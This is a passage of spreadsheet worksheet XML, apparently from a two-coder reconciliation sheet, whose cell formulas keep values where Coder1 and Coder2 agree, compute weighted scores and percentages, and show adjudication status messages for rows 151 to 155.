        <f>IF(AND(Coder1!S151&amp;""&lt;&gt;"",Coder1!S151&amp;""=Coder2!S151&amp;""),Coder1!S151,"")</f>
        <v/>
      </c>
      <c r="T151" s="14">
        <f>IF(AND(Coder1!T151&amp;""&lt;&gt;"",Coder1!T151&amp;""=Coder2!T151&amp;""),Coder1!T151,"")</f>
        <v/>
      </c>
      <c r="U151" s="14">
        <f>IF(AND(Coder1!U151&amp;""&lt;&gt;"",Coder1!U151&amp;""=Coder2!U151&amp;""),Coder1!U151,"")</f>
        <v/>
      </c>
      <c r="V151" s="14">
        <f>IF(AND(Coder1!V151&amp;""&lt;&gt;"",Coder1!V151&amp;""=Coder2!V151&amp;""),Coder1!V151,"")</f>
        <v/>
      </c>
      <c r="W151" s="14">
        <f>IF(AND(Coder1!W151&amp;""&lt;&gt;"",Coder1!W151&amp;""=Coder2!W151&amp;""),Coder1!W151,"")</f>
        <v/>
      </c>
      <c r="X151" s="14">
        <f>IF(AND(Coder1!X151&amp;""&lt;&gt;"",Coder1!X151&amp;""=Coder2!X151&amp;""),Coder1!X151,"")</f>
        <v/>
      </c>
      <c r="Y151" s="14">
        <f>IF(AND(Coder1!Y151&amp;""&lt;&gt;"",Coder1!Y151&amp;""=Coder2!Y151&amp;""),Coder1!Y151,"")</f>
        <v/>
      </c>
      <c r="Z151" s="14">
        <f>IF(AND(Coder1!Z151&amp;""&lt;&gt;"",Coder1!Z151&amp;""=Coder2!Z151&amp;""),Coder1!Z151,"")</f>
        <v/>
      </c>
      <c r="AA151" s="14">
        <f>IF(AND(Coder1!AA151&amp;""&lt;&gt;"",Coder1!AA151&amp;""=Coder2!AA151&amp;""),Coder1!AA151,"")</f>
        <v/>
      </c>
      <c r="AB151" s="14">
        <f>IF(AND(Coder1!AB151&amp;""&lt;&gt;"",Coder1!AB151&amp;""=Coder2!AB151&amp;""),Coder1!AB151,"")</f>
        <v/>
      </c>
      <c r="AC151" s="14">
        <f>IF(AND(Coder1!AC151&amp;""&lt;&gt;"",Coder1!AC151&amp;""=Coder2!AC151&amp;""),Coder1!AC151,"")</f>
        <v/>
      </c>
      <c r="AD151" s="14">
        <f>IF(AND(Coder1!AD151&amp;""&lt;&gt;"",Coder1!AD151&amp;""=Coder2!AD151&amp;""),Coder1!AD151,"")</f>
        <v/>
      </c>
      <c r="AE151" s="14">
        <f>IF(AND(Coder1!AE151&amp;""&lt;&gt;"",Coder1!AE151&amp;""=Coder2!AE151&amp;""),Coder1!AE151,"")</f>
        <v/>
      </c>
      <c r="AF151" s="14">
        <f>IF(AND(Coder1!AF151&amp;""&lt;&gt;"",Coder1!AF151&amp;""=Coder2!AF151&amp;""),Coder1!AF151,"")</f>
        <v/>
      </c>
      <c r="AG151" s="14">
        <f>IF(AND(Coder1!AG151&amp;""&lt;&gt;"",Coder1!AG151&amp;""=Coder2!AG151&amp;""),Coder1!AG151,"")</f>
        <v/>
      </c>
      <c r="AH151" s="14">
        <f>IF(AND(Coder1!AH151&amp;""&lt;&gt;"",Coder1!AH151&amp;""=Coder2!AH151&amp;""),Coder1!AH151,"")</f>
        <v/>
      </c>
      <c r="AI151" s="11">
        <f>IF(COUNT(E151:L151)=0,"",SUM(E151:L151))</f>
        <v/>
      </c>
      <c r="AJ151" s="11">
        <f>IF(AI151="","",N(E151)*3+N(F151)*2+N(G151)*2+N(H151)*2+N(I151)*2+N(J151)*3+N(K151)*3+N(L151)*3)</f>
        <v/>
      </c>
      <c r="AK151" s="11">
        <f>IF(AI151="","",COUNTIF(N151:AG151,1))</f>
        <v/>
      </c>
      <c r="AL151" s="11">
        <f>IF(OR(AJ151="",AJ151=0),"",ROUND(100*(AJ151-AK151)/AJ151,1))</f>
        <v/>
      </c>
      <c r="AM151" s="11">
        <f>IF(AND(Coder1!AN151=1,Coder2!AN151=1),IF(COUNTBLANK(E151:AH151)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN151" s="11">
        <f>IF(AND(Coder1!AN151=1,Coder2!AN151=1),IF(SUMPRODUCT(--(Coder1!E151:AH151&amp;""&lt;&gt;Coder2!E151:AH151&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO151" s="11" t="n"/>
    </row>
    <row r="152">
      <c r="A152" s="11">
        <f>Coder1!A152</f>
        <v/>
      </c>
      <c r="B152" s="11">
        <f>Coder1!B152</f>
        <v/>
      </c>
      <c r="C152" s="11">
        <f>Coder1!C152</f>
        <v/>
      </c>
      <c r="D152" s="11">
        <f>Coder1!D152</f>
        <v/>
      </c>
      <c r="E152" s="14">
        <f>IF(AND(Coder1!E152&amp;""&lt;&gt;"",Coder1!E152&amp;""=Coder2!E152&amp;""),Coder1!E152,"")</f>
        <v/>
      </c>
      <c r="F152" s="14">
        <f>IF(AND(Coder1!F152&amp;""&lt;&gt;"",Coder1!F152&amp;""=Coder2!F152&amp;""),Coder1!F152,"")</f>
        <v/>
      </c>
      <c r="G152" s="14">
        <f>IF(AND(Coder1!G152&amp;""&lt;&gt;"",Coder1!G152&amp;""=Coder2!G152&amp;""),Coder1!G152,"")</f>
        <v/>
      </c>
      <c r="H152" s="14">
        <f>IF(AND(Coder1!H152&amp;""&lt;&gt;"",Coder1!H152&amp;""=Coder2!H152&amp;""),Coder1!H152,"")</f>
        <v/>
      </c>
      <c r="I152" s="14">
        <f>IF(AND(Coder1!I152&amp;""&lt;&gt;"",Coder1!I152&amp;""=Coder2!I152&amp;""),Coder1!I152,"")</f>
        <v/>
      </c>
      <c r="J152" s="14">
        <f>IF(AND(Coder1!J152&amp;""&lt;&gt;"",Coder1!J152&amp;""=Coder2!J152&amp;""),Coder1!J152,"")</f>
        <v/>
      </c>
      <c r="K152" s="14">
        <f>IF(AND(Coder1!K152&amp;""&lt;&gt;"",Coder1!K152&amp;""=Coder2!K152&amp;""),Coder1!K152,"")</f>
        <v/>
      </c>
      <c r="L152" s="14">
        <f>IF(AND(Coder1!L152&amp;""&lt;&gt;"",Coder1!L152&amp;""=Coder2!L152&amp;""),Coder1!L152,"")</f>
        <v/>
      </c>
      <c r="M152" s="14">
        <f>IF(AND(Coder1!M152&amp;""&lt;&gt;"",Coder1!M152&amp;""=Coder2!M152&amp;""),Coder1!M152,"")</f>
        <v/>
      </c>
      <c r="N152" s="14">
        <f>IF(AND(Coder1!N152&amp;""&lt;&gt;"",Coder1!N152&amp;""=Coder2!N152&amp;""),Coder1!N152,"")</f>
        <v/>
      </c>
      <c r="O152" s="14">
        <f>IF(AND(Coder1!O152&amp;""&lt;&gt;"",Coder1!O152&amp;""=Coder2!O152&amp;""),Coder1!O152,"")</f>
        <v/>
      </c>
      <c r="P152" s="14">
        <f>IF(AND(Coder1!P152&amp;""&lt;&gt;"",Coder1!P152&amp;""=Coder2!P152&amp;""),Coder1!P152,"")</f>
        <v/>
      </c>
      <c r="Q152" s="14">
        <f>IF(AND(Coder1!Q152&amp;""&lt;&gt;"",Coder1!Q152&amp;""=Coder2!Q152&amp;""),Coder1!Q152,"")</f>
        <v/>
      </c>
      <c r="R152" s="14">
        <f>IF(AND(Coder1!R152&amp;""&lt;&gt;"",Coder1!R152&amp;""=Coder2!R152&amp;""),Coder1!R152,"")</f>
        <v/>
      </c>
      <c r="S152" s="14">
        <f>IF(AND(Coder1!S152&amp;""&lt;&gt;"",Coder1!S152&amp;""=Coder2!S152&amp;""),Coder1!S152,"")</f>
        <v/>
      </c>
      <c r="T152" s="14">
        <f>IF(AND(Coder1!T152&amp;""&lt;&gt;"",Coder1!T152&amp;""=Coder2!T152&amp;""),Coder1!T152,"")</f>
        <v/>
      </c>
      <c r="U152" s="14">
        <f>IF(AND(Coder1!U152&amp;""&lt;&gt;"",Coder1!U152&amp;""=Coder2!U152&amp;""),Coder1!U152,"")</f>
        <v/>
      </c>
      <c r="V152" s="14">
        <f>IF(AND(Coder1!V152&amp;""&lt;&gt;"",Coder1!V152&amp;""=Coder2!V152&amp;""),Coder1!V152,"")</f>
        <v/>
      </c>
      <c r="W152" s="14">
        <f>IF(AND(Coder1!W152&amp;""&lt;&gt;"",Coder1!W152&amp;""=Coder2!W152&amp;""),Coder1!W152,"")</f>
        <v/>
      </c>
      <c r="X152" s="14">
        <f>IF(AND(Coder1!X152&amp;""&lt;&gt;"",Coder1!X152&amp;""=Coder2!X152&amp;""),Coder1!X152,"")</f>
        <v/>
      </c>
      <c r="Y152" s="14">
        <f>IF(AND(Coder1!Y152&amp;""&lt;&gt;"",Coder1!Y152&amp;""=Coder2!Y152&amp;""),Coder1!Y152,"")</f>
        <v/>
      </c>
      <c r="Z152" s="14">
        <f>IF(AND(Coder1!Z152&amp;""&lt;&gt;"",Coder1!Z152&amp;""=Coder2!Z152&amp;""),Coder1!Z152,"")</f>
        <v/>
      </c>
      <c r="AA152" s="14">
        <f>IF(AND(Coder1!AA152&amp;""&lt;&gt;"",Coder1!AA152&amp;""=Coder2!AA152&amp;""),Coder1!AA152,"")</f>
        <v/>
      </c>
      <c r="AB152" s="14">
        <f>IF(AND(Coder1!AB152&amp;""&lt;&gt;"",Coder1!AB152&amp;""=Coder2!AB152&amp;""),Coder1!AB152,"")</f>
        <v/>
      </c>
      <c r="AC152" s="14">
        <f>IF(AND(Coder1!AC152&amp;""&lt;&gt;"",Coder1!AC152&amp;""=Coder2!AC152&amp;""),Coder1!AC152,"")</f>
        <v/>
      </c>
      <c r="AD152" s="14">
        <f>IF(AND(Coder1!AD152&amp;""&lt;&gt;"",Coder1!AD152&amp;""=Coder2!AD152&amp;""),Coder1!AD152,"")</f>
        <v/>
      </c>
      <c r="AE152" s="14">
        <f>IF(AND(Coder1!AE152&amp;""&lt;&gt;"",Coder1!AE152&amp;""=Coder2!AE152&amp;""),Coder1!AE152,"")</f>
        <v/>
      </c>
      <c r="AF152" s="14">
        <f>IF(AND(Coder1!AF152&amp;""&lt;&gt;"",Coder1!AF152&amp;""=Coder2!AF152&amp;""),Coder1!AF152,"")</f>
        <v/>
      </c>
      <c r="AG152" s="14">
        <f>IF(AND(Coder1!AG152&amp;""&lt;&gt;"",Coder1!AG152&amp;""=Coder2!AG152&amp;""),Coder1!AG152,"")</f>
        <v/>
      </c>
      <c r="AH152" s="14">
        <f>IF(AND(Coder1!AH152&amp;""&lt;&gt;"",Coder1!AH152&amp;""=Coder2!AH152&amp;""),Coder1!AH152,"")</f>
        <v/>
      </c>
      <c r="AI152" s="11">
        <f>IF(COUNT(E152:L152)=0,"",SUM(E152:L152))</f>
        <v/>
      </c>
      <c r="AJ152" s="11">
        <f>IF(AI152="","",N(E152)*3+N(F152)*2+N(G152)*2+N(H152)*2+N(I152)*2+N(J152)*3+N(K152)*3+N(L152)*3)</f>
        <v/>
      </c>
      <c r="AK152" s="11">
        <f>IF(AI152="","",COUNTIF(N152:AG152,1))</f>
        <v/>
      </c>
      <c r="AL152" s="11">
        <f>IF(OR(AJ152="",AJ152=0),"",ROUND(100*(AJ152-AK152)/AJ152,1))</f>
        <v/>
      </c>
      <c r="AM152" s="11">
        <f>IF(AND(Coder1!AN152=1,Coder2!AN152=1),IF(COUNTBLANK(E152:AH152)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN152" s="11">
        <f>IF(AND(Coder1!AN152=1,Coder2!AN152=1),IF(SUMPRODUCT(--(Coder1!E152:AH152&amp;""&lt;&gt;Coder2!E152:AH152&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO152" s="11" t="n"/>
    </row>
    <row r="153">
      <c r="A153" s="11">
        <f>Coder1!A153</f>
        <v/>
      </c>
      <c r="B153" s="11">
        <f>Coder1!B153</f>
        <v/>
      </c>
      <c r="C153" s="11">
        <f>Coder1!C153</f>
        <v/>
      </c>
      <c r="D153" s="11">
        <f>Coder1!D153</f>
        <v/>
      </c>
      <c r="E153" s="14">
        <f>IF(AND(Coder1!E153&amp;""&lt;&gt;"",Coder1!E153&amp;""=Coder2!E153&amp;""),Coder1!E153,"")</f>
        <v/>
      </c>
      <c r="F153" s="14">
        <f>IF(AND(Coder1!F153&amp;""&lt;&gt;"",Coder1!F153&amp;""=Coder2!F153&amp;""),Coder1!F153,"")</f>
        <v/>
      </c>
      <c r="G153" s="14">
        <f>IF(AND(Coder1!G153&amp;""&lt;&gt;"",Coder1!G153&amp;""=Coder2!G153&amp;""),Coder1!G153,"")</f>
        <v/>
      </c>
      <c r="H153" s="14">
        <f>IF(AND(Coder1!H153&amp;""&lt;&gt;"",Coder1!H153&amp;""=Coder2!H153&amp;""),Coder1!H153,"")</f>
        <v/>
      </c>
      <c r="I153" s="14">
        <f>IF(AND(Coder1!I153&amp;""&lt;&gt;"",Coder1!I153&amp;""=Coder2!I153&amp;""),Coder1!I153,"")</f>
        <v/>
      </c>
      <c r="J153" s="14">
        <f>IF(AND(Coder1!J153&amp;""&lt;&gt;"",Coder1!J153&amp;""=Coder2!J153&amp;""),Coder1!J153,"")</f>
        <v/>
      </c>
      <c r="K153" s="14">
        <f>IF(AND(Coder1!K153&amp;""&lt;&gt;"",Coder1!K153&amp;""=Coder2!K153&amp;""),Coder1!K153,"")</f>
        <v/>
      </c>
      <c r="L153" s="14">
        <f>IF(AND(Coder1!L153&amp;""&lt;&gt;"",Coder1!L153&amp;""=Coder2!L153&amp;""),Coder1!L153,"")</f>
        <v/>
      </c>
      <c r="M153" s="14">
        <f>IF(AND(Coder1!M153&amp;""&lt;&gt;"",Coder1!M153&amp;""=Coder2!M153&amp;""),Coder1!M153,"")</f>
        <v/>
      </c>
      <c r="N153" s="14">
        <f>IF(AND(Coder1!N153&amp;""&lt;&gt;"",Coder1!N153&amp;""=Coder2!N153&amp;""),Coder1!N153,"")</f>
        <v/>
      </c>
      <c r="O153" s="14">
        <f>IF(AND(Coder1!O153&amp;""&lt;&gt;"",Coder1!O153&amp;""=Coder2!O153&amp;""),Coder1!O153,"")</f>
        <v/>
      </c>
      <c r="P153" s="14">
        <f>IF(AND(Coder1!P153&amp;""&lt;&gt;"",Coder1!P153&amp;""=Coder2!P153&amp;""),Coder1!P153,"")</f>
        <v/>
      </c>
      <c r="Q153" s="14">
        <f>IF(AND(Coder1!Q153&amp;""&lt;&gt;"",Coder1!Q153&amp;""=Coder2!Q153&amp;""),Coder1!Q153,"")</f>
        <v/>
      </c>
      <c r="R153" s="14">
        <f>IF(AND(Coder1!R153&amp;""&lt;&gt;"",Coder1!R153&amp;""=Coder2!R153&amp;""),Coder1!R153,"")</f>
        <v/>
      </c>
      <c r="S153" s="14">
        <f>IF(AND(Coder1!S153&amp;""&lt;&gt;"",Coder1!S153&amp;""=Coder2!S153&amp;""),Coder1!S153,"")</f>
        <v/>
      </c>
      <c r="T153" s="14">
        <f>IF(AND(Coder1!T153&amp;""&lt;&gt;"",Coder1!T153&amp;""=Coder2!T153&amp;""),Coder1!T153,"")</f>
        <v/>
      </c>
      <c r="U153" s="14">
        <f>IF(AND(Coder1!U153&amp;""&lt;&gt;"",Coder1!U153&amp;""=Coder2!U153&amp;""),Coder1!U153,"")</f>
        <v/>
      </c>
      <c r="V153" s="14">
        <f>IF(AND(Coder1!V153&amp;""&lt;&gt;"",Coder1!V153&amp;""=Coder2!V153&amp;""),Coder1!V153,"")</f>
        <v/>
      </c>
      <c r="W153" s="14">
        <f>IF(AND(Coder1!W153&amp;""&lt;&gt;"",Coder1!W153&amp;""=Coder2!W153&amp;""),Coder1!W153,"")</f>
        <v/>
      </c>
      <c r="X153" s="14">
        <f>IF(AND(Coder1!X153&amp;""&lt;&gt;"",Coder1!X153&amp;""=Coder2!X153&amp;""),Coder1!X153,"")</f>
        <v/>
      </c>
      <c r="Y153" s="14">
        <f>IF(AND(Coder1!Y153&amp;""&lt;&gt;"",Coder1!Y153&amp;""=Coder2!Y153&amp;""),Coder1!Y153,"")</f>
        <v/>
      </c>
      <c r="Z153" s="14">
        <f>IF(AND(Coder1!Z153&amp;""&lt;&gt;"",Coder1!Z153&amp;""=Coder2!Z153&amp;""),Coder1!Z153,"")</f>
        <v/>
      </c>
      <c r="AA153" s="14">
        <f>IF(AND(Coder1!AA153&amp;""&lt;&gt;"",Coder1!AA153&amp;""=Coder2!AA153&amp;""),Coder1!AA153,"")</f>
        <v/>
      </c>
      <c r="AB153" s="14">
        <f>IF(AND(Coder1!AB153&amp;""&lt;&gt;"",Coder1!AB153&amp;""=Coder2!AB153&amp;""),Coder1!AB153,"")</f>
        <v/>
      </c>
      <c r="AC153" s="14">
        <f>IF(AND(Coder1!AC153&amp;""&lt;&gt;"",Coder1!AC153&amp;""=Coder2!AC153&amp;""),Coder1!AC153,"")</f>
        <v/>
      </c>
      <c r="AD153" s="14">
        <f>IF(AND(Coder1!AD153&amp;""&lt;&gt;"",Coder1!AD153&amp;""=Coder2!AD153&amp;""),Coder1!AD153,"")</f>
        <v/>
      </c>
      <c r="AE153" s="14">
        <f>IF(AND(Coder1!AE153&amp;""&lt;&gt;"",Coder1!AE153&amp;""=Coder2!AE153&amp;""),Coder1!AE153,"")</f>
        <v/>
      </c>
      <c r="AF153" s="14">
        <f>IF(AND(Coder1!AF153&amp;""&lt;&gt;"",Coder1!AF153&amp;""=Coder2!AF153&amp;""),Coder1!AF153,"")</f>
        <v/>
      </c>
      <c r="AG153" s="14">
        <f>IF(AND(Coder1!AG153&amp;""&lt;&gt;"",Coder1!AG153&amp;""=Coder2!AG153&amp;""),Coder1!AG153,"")</f>
        <v/>
      </c>
      <c r="AH153" s="14">
        <f>IF(AND(Coder1!AH153&amp;""&lt;&gt;"",Coder1!AH153&amp;""=Coder2!AH153&amp;""),Coder1!AH153,"")</f>
        <v/>
      </c>
      <c r="AI153" s="11">
        <f>IF(COUNT(E153:L153)=0,"",SUM(E153:L153))</f>
        <v/>
      </c>
      <c r="AJ153" s="11">
        <f>IF(AI153="","",N(E153)*3+N(F153)*2+N(G153)*2+N(H153)*2+N(I153)*2+N(J153)*3+N(K153)*3+N(L153)*3)</f>
        <v/>
      </c>
      <c r="AK153" s="11">
        <f>IF(AI153="","",COUNTIF(N153:AG153,1))</f>
        <v/>
      </c>
      <c r="AL153" s="11">
        <f>IF(OR(AJ153="",AJ153=0),"",ROUND(100*(AJ153-AK153)/AJ153,1))</f>
        <v/>
      </c>
      <c r="AM153" s="11">
        <f>IF(AND(Coder1!AN153=1,Coder2!AN153=1),IF(COUNTBLANK(E153:AH153)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN153" s="11">
        <f>IF(AND(Coder1!AN153=1,Coder2!AN153=1),IF(SUMPRODUCT(--(Coder1!E153:AH153&amp;""&lt;&gt;Coder2!E153:AH153&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO153" s="11" t="n"/>
    </row>
    <row r="154">
      <c r="A154" s="11">
        <f>Coder1!A154</f>
        <v/>
      </c>
      <c r="B154" s="11">
        <f>Coder1!B154</f>
        <v/>
      </c>
      <c r="C154" s="11">
        <f>Coder1!C154</f>
        <v/>
      </c>
      <c r="D154" s="11">
        <f>Coder1!D154</f>
        <v/>
      </c>
      <c r="E154" s="14">
        <f>IF(AND(Coder1!E154&amp;""&lt;&gt;"",Coder1!E154&amp;""=Coder2!E154&amp;""),Coder1!E154,"")</f>
        <v/>
      </c>
      <c r="F154" s="14">
        <f>IF(AND(Coder1!F154&amp;""&lt;&gt;"",Coder1!F154&amp;""=Coder2!F154&amp;""),Coder1!F154,"")</f>
        <v/>
      </c>
      <c r="G154" s="14">
        <f>IF(AND(Coder1!G154&amp;""&lt;&gt;"",Coder1!G154&amp;""=Coder2!G154&amp;""),Coder1!G154,"")</f>
        <v/>
      </c>
      <c r="H154" s="14">
        <f>IF(AND(Coder1!H154&amp;""&lt;&gt;"",Coder1!H154&amp;""=Coder2!H154&amp;""),Coder1!H154,"")</f>
        <v/>
      </c>
      <c r="I154" s="14">
        <f>IF(AND(Coder1!I154&amp;""&lt;&gt;"",Coder1!I154&amp;""=Coder2!I154&amp;""),Coder1!I154,"")</f>
        <v/>
      </c>
      <c r="J154" s="14">
        <f>IF(AND(Coder1!J154&amp;""&lt;&gt;"",Coder1!J154&amp;""=Coder2!J154&amp;""),Coder1!J154,"")</f>
        <v/>
      </c>
      <c r="K154" s="14">
        <f>IF(AND(Coder1!K154&amp;""&lt;&gt;"",Coder1!K154&amp;""=Coder2!K154&amp;""),Coder1!K154,"")</f>
        <v/>
      </c>
      <c r="L154" s="14">
        <f>IF(AND(Coder1!L154&amp;""&lt;&gt;"",Coder1!L154&amp;""=Coder2!L154&amp;""),Coder1!L154,"")</f>
        <v/>
      </c>
      <c r="M154" s="14">
        <f>IF(AND(Coder1!M154&amp;""&lt;&gt;"",Coder1!M154&amp;""=Coder2!M154&amp;""),Coder1!M154,"")</f>
        <v/>
      </c>
      <c r="N154" s="14">
        <f>IF(AND(Coder1!N154&amp;""&lt;&gt;"",Coder1!N154&amp;""=Coder2!N154&amp;""),Coder1!N154,"")</f>
        <v/>
      </c>
      <c r="O154" s="14">
        <f>IF(AND(Coder1!O154&amp;""&lt;&gt;"",Coder1!O154&amp;""=Coder2!O154&amp;""),Coder1!O154,"")</f>
        <v/>
      </c>
      <c r="P154" s="14">
        <f>IF(AND(Coder1!P154&amp;""&lt;&gt;"",Coder1!P154&amp;""=Coder2!P154&amp;""),Coder1!P154,"")</f>
        <v/>
      </c>
      <c r="Q154" s="14">
        <f>IF(AND(Coder1!Q154&amp;""&lt;&gt;"",Coder1!Q154&amp;""=Coder2!Q154&amp;""),Coder1!Q154,"")</f>
        <v/>
      </c>
      <c r="R154" s="14">
        <f>IF(AND(Coder1!R154&amp;""&lt;&gt;"",Coder1!R154&amp;""=Coder2!R154&amp;""),Coder1!R154,"")</f>
        <v/>
      </c>
      <c r="S154" s="14">
        <f>IF(AND(Coder1!S154&amp;""&lt;&gt;"",Coder1!S154&amp;""=Coder2!S154&amp;""),Coder1!S154,"")</f>
        <v/>
      </c>
      <c r="T154" s="14">
        <f>IF(AND(Coder1!T154&amp;""&lt;&gt;"",Coder1!T154&amp;""=Coder2!T154&amp;""),Coder1!T154,"")</f>
        <v/>
      </c>
      <c r="U154" s="14">
        <f>IF(AND(Coder1!U154&amp;""&lt;&gt;"",Coder1!U154&amp;""=Coder2!U154&amp;""),Coder1!U154,"")</f>
        <v/>
      </c>
      <c r="V154" s="14">
        <f>IF(AND(Coder1!V154&amp;""&lt;&gt;"",Coder1!V154&amp;""=Coder2!V154&amp;""),Coder1!V154,"")</f>
        <v/>
      </c>
      <c r="W154" s="14">
        <f>IF(AND(Coder1!W154&amp;""&lt;&gt;"",Coder1!W154&amp;""=Coder2!W154&amp;""),Coder1!W154,"")</f>
        <v/>
      </c>
      <c r="X154" s="14">
        <f>IF(AND(Coder1!X154&amp;""&lt;&gt;"",Coder1!X154&amp;""=Coder2!X154&amp;""),Coder1!X154,"")</f>
        <v/>
      </c>
      <c r="Y154" s="14">
        <f>IF(AND(Coder1!Y154&amp;""&lt;&gt;"",Coder1!Y154&amp;""=Coder2!Y154&amp;""),Coder1!Y154,"")</f>
        <v/>
      </c>
      <c r="Z154" s="14">
        <f>IF(AND(Coder1!Z154&amp;""&lt;&gt;"",Coder1!Z154&amp;""=Coder2!Z154&amp;""),Coder1!Z154,"")</f>
        <v/>
      </c>
      <c r="AA154" s="14">
        <f>IF(AND(Coder1!AA154&amp;""&lt;&gt;"",Coder1!AA154&amp;""=Coder2!AA154&amp;""),Coder1!AA154,"")</f>
        <v/>
      </c>
      <c r="AB154" s="14">
        <f>IF(AND(Coder1!AB154&amp;""&lt;&gt;"",Coder1!AB154&amp;""=Coder2!AB154&amp;""),Coder1!AB154,"")</f>
        <v/>
      </c>
      <c r="AC154" s="14">
        <f>IF(AND(Coder1!AC154&amp;""&lt;&gt;"",Coder1!AC154&amp;""=Coder2!AC154&amp;""),Coder1!AC154,"")</f>
        <v/>
      </c>
      <c r="AD154" s="14">
        <f>IF(AND(Coder1!AD154&amp;""&lt;&gt;"",Coder1!AD154&amp;""=Coder2!AD154&amp;""),Coder1!AD154,"")</f>
        <v/>
      </c>
      <c r="AE154" s="14">
        <f>IF(AND(Coder1!AE154&amp;""&lt;&gt;"",Coder1!AE154&amp;""=Coder2!AE154&amp;""),Coder1!AE154,"")</f>
        <v/>
      </c>
      <c r="AF154" s="14">
        <f>IF(AND(Coder1!AF154&amp;""&lt;&gt;"",Coder1!AF154&amp;""=Coder2!AF154&amp;""),Coder1!AF154,"")</f>
        <v/>
      </c>
      <c r="AG154" s="14">
        <f>IF(AND(Coder1!AG154&amp;""&lt;&gt;"",Coder1!AG154&amp;""=Coder2!AG154&amp;""),Coder1!AG154,"")</f>
        <v/>
      </c>
      <c r="AH154" s="14">
        <f>IF(AND(Coder1!AH154&amp;""&lt;&gt;"",Coder1!AH154&amp;""=Coder2!AH154&amp;""),Coder1!AH154,"")</f>
        <v/>
      </c>
      <c r="AI154" s="11">
        <f>IF(COUNT(E154:L154)=0,"",SUM(E154:L154))</f>
        <v/>
      </c>
      <c r="AJ154" s="11">
        <f>IF(AI154="","",N(E154)*3+N(F154)*2+N(G154)*2+N(H154)*2+N(I154)*2+N(J154)*3+N(K154)*3+N(L154)*3)</f>
        <v/>
      </c>
      <c r="AK154" s="11">
        <f>IF(AI154="","",COUNTIF(N154:AG154,1))</f>
        <v/>
      </c>
      <c r="AL154" s="11">
        <f>IF(OR(AJ154="",AJ154=0),"",ROUND(100*(AJ154-AK154)/AJ154,1))</f>
        <v/>
      </c>
      <c r="AM154" s="11">
        <f>IF(AND(Coder1!AN154=1,Coder2!AN154=1),IF(COUNTBLANK(E154:AH154)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN154" s="11">
        <f>IF(AND(Coder1!AN154=1,Coder2!AN154=1),IF(SUMPRODUCT(--(Coder1!E154:AH154&amp;""&lt;&gt;Coder2!E154:AH154&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO154" s="11" t="n"/>
    </row>
    <row r="155">
      <c r="A155" s="11">
        <f>Coder1!A155</f>
        <v/>
      </c>
      <c r="B155" s="11">
        <f>Coder1!B155</f>
        <v/>
      </c>
      <c r="C155" s="11">
        <f>Coder1!C155</f>
        <v/>
      </c>
      <c r="D155" s="11">
        <f>Coder1!D155</f>
        <v/>
      </c>
      <c r="E155" s="14">
        <f>IF(AND(Coder1!E155&amp;""&lt;&gt;"",Coder1!E155&amp;""=Coder2!E155&amp;""),Coder1!E155,"")</f>
        <v/>
      </c>
      <c r="F155" s="14">
        <f>IF(AND(Coder1!F155&amp;""&lt;&gt;"",Coder1!F155&amp;""=Coder2!F155&amp;""),Coder1!F155,"")</f>
        <v/>
      </c>
      <c r="G155" s="14">
        <f>IF(AND(Coder1!G155&amp;""&lt;&gt;"",Coder1!G155&amp;""=Coder2!G155&amp;""),Coder1!G155,"")</f>
        <v/>
      </c>
      <c r="H155" s="14">
        <f>IF(AND(Coder1!H155&amp;""&lt;&gt;"",Coder1!H155&amp;""=Coder2!H155&amp;""),Coder1!H155,"")</f>
        <v/>
      </c>
      <c r="I155" s="14">
        <f>IF(AND(Coder1!I155&amp;""&lt;&gt;"",Coder1!I155&amp;""=Coder2!I155&amp;""),Coder1!I155,"")</f>
        <v/>
      </c>
      <c r="J155" s="14">
        <f>IF(AND(Coder1!J155&amp;""&lt;&gt;"",Coder1!J155&amp;""=Coder2!J155&amp;""),Coder1!J155,"")</f>
        <v/>
      </c>
      <c r="K155" s="14">
        <f>IF(AND(Coder1!K155&amp;""&lt;&gt;"",Coder1!K155&amp;""=Coder2!K155&amp;""),Coder1!K155,"")</f>
        <v/>
      </c>
      <c r="L155" s="14">
        <f>IF(AND(Coder1!L155&amp;""&lt;&gt;"",Coder1!L155&amp;""=Coder2!L155&amp;""),Coder1!L155,"")</f>
        <v/>
      </c>
      <c r="M155" s="14">
        <f>IF(AND(Coder1!M155&amp;""&lt;&gt;"",Coder1!M155&amp;""=Coder2!M155&amp;""),Coder1!M155,"")</f>
        <v/>
      </c>
      <c r="N155" s="14">
        <f>IF(AND(Coder1!N155&amp;""&lt;&gt;"",Coder1!N155&amp;""=Coder2!N155&amp;""),Coder1!N155,"")</f>
        <v/>
      </c>
      <c r="O155" s="14">
        <f>IF(AND(Coder1!O155&amp;""&lt;&gt;"",Coder1!O155&amp;""=Coder2!O155&amp;""),Coder1!O155,"")</f>
        <v/>
      </c>
      <c r="P155" s="14">
        <f>IF(AND(Coder1!P155&amp;""&lt;&gt;"",Coder1!P155&amp;""=Coder2!P155&amp;""),Coder1!P155,"")</f>
        <v/>
      </c>
      <c r="Q155" s="14">
        <f>IF(AND(Coder1!Q155&amp;""&lt;&gt;"",Coder1!Q155&amp;""=Coder2!Q155&amp;""),Coder1!Q155,"")</f>
        <v/>
      </c>
      <c r="R155" s="14">
        <f>IF(AND(Coder1!R155&amp;""&lt;&gt;"",Coder1!R155&amp;""=Coder2!R155&amp;""),Coder1!R155,"")</f>
        <v/>
      </c>
      <c r="S155" s="14">
        <f>IF(AND(Coder1!S155&amp;""&lt;&gt;"",Coder1!S155&amp;""=Coder2!S155&amp;""),Coder1!S155,"")</f>
        <v/>
      </c>
      <c r="T155" s="14">
        <f>IF(AND(Coder1!T155&amp;""&lt;&gt;"",Coder1!T155&amp;""=Coder2!T155&amp;""),Coder1!T155,"")</f>
        <v/>
      </c>
      <c r="U155" s="14">
        <f>IF(AND(Coder1!U155&amp;""&lt;&gt;"",Coder1!U155&amp;""=Coder2!U155&amp;""),Coder1!U155,"")</f>
        <v/>
      </c>
      <c r="V155" s="14">
